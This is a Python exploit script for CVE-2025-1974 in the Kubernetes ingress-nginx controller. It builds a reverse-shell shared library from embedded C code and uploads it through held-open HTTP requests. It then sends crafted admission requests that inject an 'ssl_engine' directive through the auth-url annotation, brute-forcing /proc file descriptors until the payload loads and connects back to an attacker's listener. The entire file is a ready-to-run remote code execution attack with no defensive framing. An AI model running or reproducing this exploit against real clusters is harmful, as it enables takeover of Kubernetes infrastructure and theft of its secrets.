#!/usr/bin/env python3
import asyncio
import json
import os
import subprocess
import tempfile
import argparse
from pathlib import Path
import sys
import httpx

# Default shellcode for reverse shell
DEFAULT_SHELL_C = """
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

__attribute__((constructor)) static void reverse_shell(void)
{
    char *server_ip="REVERSE_SHELL_IP";
    uint32_t server_port=REVERSE_SHELL_PORT;
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in attacker_addr = {0};
    attacker_addr.sin_family = AF_INET;
    attacker_addr.sin_port = htons(server_port);
    attacker_addr.sin_addr.s_addr = inet_addr(server_ip);
    if(connect(sock, (struct sockaddr *)&attacker_addr,sizeof(attacker_addr))!=0)
        exit(0);
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);
}
"""

data_req = json.loads("""
                  {
  "kind": "AdmissionReview",
  "apiVersion": "admission.k8s.io/v1",
  "request": {
    "uid": "85b707bf-4241-4f9b-9ee8-7809c7132cdc",
    "kind": {
      "group": "networking.k8s.io",
      "version": "v1",
      "kind": "Ingress"
    },
    "resource": {
      "group": "networking.k8s.io",
      "version": "v1",
      "resource": "ingresses"
    },
    "requestKind": {
      "group": "networking.k8s.io",
      "version": "v1",
      "kind": "Ingress"
    },
    "requestResource": {
      "group": "networking.k8s.io",
      "version": "v1",
      "resource": "ingresses"
    },
    "name": "xxx",
    "namespace": "default",
    "operation": "CREATE",
    "userInfo": {
      "username": "kube-review",
      "uid": "60a7a2da-f9ec-4afc-baaa-11bf648233a8"
    },
    "object": {
      "kind": "Ingress",
      "apiVersion": "networking.k8s.io/v1",
      "metadata": {
        "name": "xxx",
        "namespace": "default",
        "creationTimestamp": null,
        "annotations": {
          "nginx.ingress.kubernetes.io/auth-url": "xxx"
        }
      },
      "spec": {
        "ingressClassName": "nginx",
        "rules": [
          {
            "host": "xxx.example.com",
            "http": {
              "paths": [
                {
                  "path": "/",
                  "pathType": "Prefix",
                  "backend": {
                    "service": {
                      "name": "xxx",
                      "port": {
                        "number": 5244
                      }
                    }
                  }
                }
              ]
            }
          }
        ]
      },
      "status": {
        "loadBalancer": {}
      }
    },
    "oldObject": null,
    "dryRun": true,
    "options": {
      "kind": "CreateOptions",
      "apiVersion": "meta.k8s.io/v1"
    }
  }
}
""")


class Exploit:
    def __init__(self, local_mode: bool = False, reverse_shell_ip: str = "10.0.0.1", 
                 reverse_shell_port: int = 4444, admission_port: int = 8443, ingress_port: int = 8080):
        """
        Initialize the exploit.
        
        Args:
            local_mode: Whether to use port-forwarded local connections
            reverse_shell_ip: IP for the reverse shell to connect back to
            reverse_shell_port: Port for the reverse shell to connect back to
            admission_port: Local port for admission controller (for local_mode)
            ingress_port: Local port for ingress controller (for local_mode)
        """
        self.reverse_shell_ip = reverse_shell_ip
        self.reverse_shell_port = reverse_shell_port
        
        if local_mode:
            self.admission_url = f"https://localhost:{admission_port}/networking/v1/ingresses"
            self.target_url = f"http://localhost:{ingress_port}/fake/addr"
        else:
            self.admission_url = "https://ingress-nginx-controller-admission.ingress-nginx.svc:443/networking/v1/ingresses"
            self.target_url = "http://ingress-nginx-controller.ingress-nginx.svc/fake/addr"
            
        self.req_data = data_req
        
    def build_shellcode(self) -> str:
        """
        Build the shellcode from C to .so
        
        Returns:
            Path to the compiled shellcode .so file
        """
        print("[+] Building shellcode...")
        
        # Create temporary directory
        temp_dir = tempfile.mkdtemp()
        shell_c_path = os.path.join(temp_dir, "shell.c")
        shell_so_path = os.path.join(temp_dir, "shell.so")
        
        # Replace IP and port in the shellcode template
        shell_c_content = DEFAULT_SHELL_C.replace("REVERSE_SHELL_IP", self.reverse_shell_ip)
        shell_c_content = shell_c_content.replace("REVERSE_SHELL_PORT", str(self.reverse_shell_port))
        
        # Write the C file
        with open(shell_c_path, "w") as f:
            f.write(shell_c_content)
        
        # Build using Docker
        docker_cmd = [
            "docker", "run", "--platform", "linux/amd64",
            "-v", f"{temp_dir}:/build", "alpine:latest", 
            "/bin/sh", "-c", 
            "cd /build && "
            "apk update && "
            "apk add musl-dev build-base && "
            "gcc shell.c -S -o shell.S && "
            "as --64 -o shell.o shell.S && "
            "ld -shared -nostdlib -z noseparate-code -z max-page-size=0x1000 -o shell.so shell.o && "
            "strip --strip-all shell.so && "
            "chmod +x shell.so && "
            "truncate -s 10240 shell.so"
        ]
        
        try:
            print("[*] Building shellcode with Docker...")
            subprocess.run(docker_cmd, check=True)
            print(f"[+] Shellcode built successfully at {shell_so_path}")
            
            with open(shell_so_path, "rb") as f:
                self.shellcode = f.read()
            
            return shell_so_path
        except subprocess.CalledProcessError as e:
            print(f"[!] Failed to build shellcode with Docker: {e}")
            print("[!] Attempting to build locally...")
            
            # Try to build locally if Docker fails
            try:
                subprocess.run(["gcc", "-shared", "-fPIC", shell_c_path, "-o", shell_so_path], check=True)
                print(f"[+] Shellcode built locally at {shell_so_path}")
                
                with open(shell_so_path, "rb") as f:
                    self.shellcode = f.read()
                
                return shell_so_path
            except subprocess.CalledProcessError as e:
                print(f"[!] Local build failed: {e}")
                raise RuntimeError("Failed to build shellcode")

    async def send_admission_req(self) -> None:
        print("[+] Searching for vulnerable file descriptors...")
        async with httpx.AsyncClient(verify=False) as client:
            for pid in range(25, 31):
                for fd in range(10, 40):
                    proc_path = f"/proc/{pid}/fd/{fd}"
                    self.req_data["request"]["object"]["metadata"]["annotations"][
                        "nginx.ingress.kubernetes.io/auth-url"
                    ] = "http://example.com/#;}}}\n\nssl_engine %s;\n\n" % (proc_path,)
                    try:
                        print(f"[*] Testing {proc_path}")
                        resp = await client.post(
                            self.admission_url,
                            json=self.req_data,
                        )
                        res = resp.json()["response"]
                        print(f"[*] Response: {res}")
                        if "No such device or address" in res["status"]["message"] or (
                            "No such file or directory" in res["status"]["message"]
                        ): 
                            continue
                    except Exception as e:
                        print(f"[!] Error: {e}")
                        continue
                    print(f"[+] Found vulnerable file descriptor: {proc_path}")
                    return

    async def upload_shellcode(self) -> None:
        """Upload shellcode through HTTP request"""
        
        class FakeIterator:
            """Async iterator that yields shellcode once then holds connection"""
            def __init__(self, shellcode):
                self.shellcode = shellcode
                self.sent = False

            async def __aiter__(self):
                yield self.shellcode
                await asyncio.sleep(60*60) 

        print(f"[+] Uploading shellcode ({len(self.shellcode)} bytes)")
        
        headers = {
            "Content-Type": "application/octet-stream",
            "Content-Length": str(len(self.shellcode) * 50),
        }
        
        async with httpx.AsyncClient() as client:
            try:
                await client.post(
                    self.target_url,
                    data=FakeIterator(self.shellcode),
                    headers=headers,
                    timeout=15
                )
            except Exception as e:
                print(f"[*] Upload connection status: {e}")

    async def run_exploit(self) -> None:
        """Run the complete exploit chain"""
        print("[+] Starting CVE-2025-1974 exploit...")
        print(f"[*] Reverse shell will connect to {self.reverse_shell_ip}:{self.reverse_shell_port}")
        print("[*] Make sure you have a listener running (e.g., nc -lvnp 4444)")
        self.build_shellcode()

        upload_tasks = [self.upload_shellcode() for _ in range(20)]
        admission_task = self.send_admission_req()
        await asyncio.gather(*upload_tasks, admission_task)
        print("[+] Exploit completed. Check your listener for incoming connection.")


async def main():
    parser = argparse.ArgumentParser(description="CVE-2025-1974 Ingress Nginx Controller Exploit")
    parser.add_argument("--local", action="store_true", help="Use local port-forwarded connection")
    parser.add_argument("--ip", required=True, help="IP for reverse shell connection")
    parser.add_argument("--port", type=int, default=4444, help="Port for reverse shell connection")
    parser.add_argument("--admission-port", type=int, default=8443, help="Local port for admission controller")
    parser.add_argument("--ingress-port", type=int, default=8080, help="Local port for ingress controller")
    
    args = parser.parse_args()
    
    if not args.ip:
        print("[!] Error: You must specify an IP address with --ip")
        sys.exit(1)
    
    exploit = Exploit(
        local_mode=args.local,
        reverse_shell_ip=args.ip,
        reverse_shell_port=args.port,
        admission_port=args.admission_port,
        ingress_port=args.ingress_port
    )
    
    await exploit.run_exploit()


if __name__ == "__main__":
    import warnings
    warnings.filterwarnings("ignore")
    
    asyncio.run(main())